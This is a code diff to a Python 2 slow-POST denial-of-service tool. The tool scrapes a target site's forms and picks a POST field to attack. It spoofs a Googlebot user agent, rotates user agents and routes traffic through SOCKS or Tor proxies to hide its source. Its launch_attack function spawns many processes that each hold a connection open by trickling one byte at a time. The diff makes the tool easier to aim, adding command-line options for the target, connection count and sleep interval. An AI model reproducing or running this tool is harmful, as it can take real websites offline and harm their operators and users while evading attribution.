@@ -11,11 +11,12 @@ import time
 from bs4 import BeautifulSoup
 from urlparse import urlparse
 from multiprocessing import Process
+from argparse import ArgumentParser
 
-MAX_WORKERS   = 500
-SLEEP_TIME    = 10
-PROXY_ADDRESS = '127.0.0.1'
-PROXY_PORT    = 9050
+MAX_CONNECTIONS      = 50
+SLEEP_TIME           = 10
+PROXY_ADDRESS        = '127.0.0.1'
+PROXY_PORT           = 9050
 DEFAULT_USER_AGENT   = '%s' %\
     'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
 
@@ -57,7 +58,11 @@ def print_forms(forms):
         print 'Form #%d --> id: %s --> class: %s --> action: %s' %\
                 (index, form['id'], form['class'], form['action'])
 
+def print_inputs(inputs):
 
+    for index, input_field in enumerate(inputs):
+        print 'Input #%d: %s' %\
+            (index, input_field['name'])
 
 def choose_form(response):
     forms = get_forms(response)
@@ -73,12 +78,6 @@ def choose_input(form):
                     'Please select a form field from the list above.',
                     form['inputs'],
                     'input')
-
-def print_inputs(inputs):
-
-    for index, input_field in enumerate(inputs):
-        print 'Input #%d: %s' %\
-            (index, input_field['name'])
 
 def make_choice(menu_function, prompt, choices, field):
 
@@ -121,24 +120,11 @@ def port_from_url(url):
         return 80
     return int(port)
 
-def parse_args():
+def select_session(configs):
 
-    return {
-        'use_proxies' : False,
-        'proxies' : [{ 'address' : PROXY_ADDRESS, 'port' : PROXY_PORT }],
-        'target' : 'http://192.168.99.102/doku.php',
-        'max_workers' : MAX_WORKERS,
-        'user_agent_file' : '',
-        'sleep_time' : SLEEP_TIME,
-    }
-    
-def configure():
-
-    args = parse_args()
-
-    if args['use_proxies']:
+    if 'proxies' in configs:
         session = requesocks.session()
-        proxy = args['proxies'][0]
+        proxy = configs['proxies'][0]
         session.proxies = {
                 'http': 'socks4://%s:%d' % (proxy['address'],proxy['port']),
                 'https': 'socks4://%s:%d' % (proxy['address'],proxy['port']),
@@ -146,48 +132,110 @@ def configure():
     else:
         session = requests.session()
 
-    response = requests.get(args['target'])
+    return session
 
+
+def parse_args():
+
+    parser = ArgumentParser()
+
+    parser.add_argument('--target',
+                    dest='target',
+                    type=str,
+                    required=True,
+                    help='Target url')
+
+    parser.add_argument('--connections',
+                    dest='connections',
+                    type=int,
+                    required=False,
+                    default=MAX_CONNECTIONS,
+                    help='The number of connections to run simultaneously (default 50)')
+    
+    parser.add_argument('--user-agents',
+                    dest='user_agent_file',
+                    type=str,
+                    required=False,
+                    help='Load user agents from file')
+
+    parser.add_argument('--proxies',
+                    dest='proxy_file',
+                    type=str,
+                    nargs='*',
+                    required=False,
+                    help='Load user agents from file')
+    
+    parser.add_argument('--sleep',
+                    dest='sleep_time',
+                    type=int,
+                    required=False,
+                    metavar='<seconds>',
+                    default=SLEEP_TIME,
+                    help='Wait <seconds> seconds before sending each byte.')
+
+    return parser.parse_args()
+    
+def configure():
+
+    args = parse_args()
+    configs = {}
+
+    if args.proxy_file is not None:
+        if args.proxy_file == []:
+            configs['proxies'] = [{
+                        'address' : PROXY_ADDRESS,
+                        'port' : PROXY_PORT,
+            }]
+        else:
+            with open(args.proxy_file) as fd:
+                configs['proxies'] = []
+                for line in fd:
+                    proxy = line.split()
+                    configs['proxies'].append({
+                        'address' : proxy[0],
+                        'port' : proxy[1],
+                    })
+
+    configs['user_agents'] = [DEFAULT_USER_AGENT]
+    if args.user_agent_file is not None:
+        with open(args.user_agent_file) as fd:
+            configs['user_agents'] += fd.read().split('\n')
+
+    # select form and target POST parameter, and set cookies 
+    session = select_session(configs)
+    response = session.get(args.target)
     form = choose_form(response)
-    form_field = choose_input(form)
+    configs['param'] = choose_input(form)['name']
+    configs['cookies'] = response.headers.get('set-cookie', '')
 
-    cookies = response.headers.get('set-cookie', '')
-
-    parsed_url = urlparse(args['target'])
-
+    # select target URL using selected form
+    parsed_url = urlparse(args.target)
     if form['action'] != '':
         if form['action'].startswith('/'):
-            target = 'http://%s%s' % (parsed_url.netloc, form['action'])
+            configs['target'] = 'http://%s%s' % (parsed_url.netloc, form['action'])
     else:
-        target = args['target']
+        configs['target'] = args.target
 
-    user_agents = [DEFAULT_USER_AGENT]
-    if args['user_agent_file'] != '':
-        with open(args['user_agent_file']) as fd:
-            user_agents += fd.read().split('\n')
+    # set path, HTTP host and port 
+    configs['path'] = parsed_url.path,
+    configs['host'] = host_from_url(configs['target'])
+    configs['port'] = port_from_url(configs['target'])
 
-    return {
+    # set connections and sleep_time
+    configs['connections'] = args.connections
+    configs['sleep_time'] = args.sleep_time
 
-        'path' : parsed_url.path,
-        'param' : form_field['name'],
-        'host' : host_from_url(target),
-        'port' : port_from_url(target),
-        'target' : target,
-        'cookies' : cookies,
-        'user_agents' : user_agents,
-        'max_workers' : args['max_workers'],
-        'sleep_time' : args['sleep_time'],
-        'use_proxies' : args['use_proxies'],
-        'proxies' : args['proxies'],
-    }
+    return configs
 
 def launch_attack(i, configs, headers):
 
     try:
 
+        # establish initial connection to target
         print '[worker %d] Establishing connection'
-        # establish connection 
-        if configs['use_proxies']:
+
+        # if we're using proxies, then we use socksocket() instead of socket()
+        if 'proxies' in configs:
 
             # select proxy
             proxy = random.choice(configs['proxies'])
@@ -209,45 +257,44 @@ def launch_attack(i, configs, headers):
         while True:
             print '[worker %d] Sending one byte to target.' % i
             sock.send("A")
-            print '[worker %d] Sleeping for %d seconds' % (configs['sleep_time'], i)
+            print '[worker %d] Sleeping for %d seconds' % (i, configs['sleep_time'])
             time.sleep(configs['sleep_time'])
     except KeyboardInterrupt:
         pass
-    sock.close()
-
-#def launch_attack(i, configs, headers):
-#
-
-#    while True:
-#        print "Worker #%d: sending \x41" % i
-#        time.sleep(configs['sleep_time'])
-#    print 'Worker #%d: closing connection' % i
+    sock.close() 
 
 if __name__ == '__main__':
 
+    # set things up
     configs = configure()
+    connections = []
 
-    workers = []
     try:
-        for i in xrange(configs['max_workers']):
 
+        # spawn connections child processes to make connections
+        for i in xrange(configs['connections']):
+
+            # craft header with random user agent for each connection
             headers = craft_headers(configs['path'],
                                 configs['host'],
                                 random.choice(configs['user_agents']),
                                 configs['param'],
                                 configs['cookies'])
 
+            # launch attack as child process
             p = Process(target=launch_attack, args=(i, configs, headers))
             p.start()
-            workers.append(p)
+            connections.append(p)
 
-        for w in workers:
-            w.join()
+        # wait for all processes to finish or user interrupt
+        for c in connections:
+            c.join()
 
     except KeyboardInterrupt:
 
+        # terminate all connections on user interrupt
         print '\n[!] Exiting on User Interrupt'
-        for w in workers:
-            w.terminate()
-        for w in workers:
-            w.join()
+        for c in connections:
+            c.terminate()
+        for c in connections:
+            c.join()
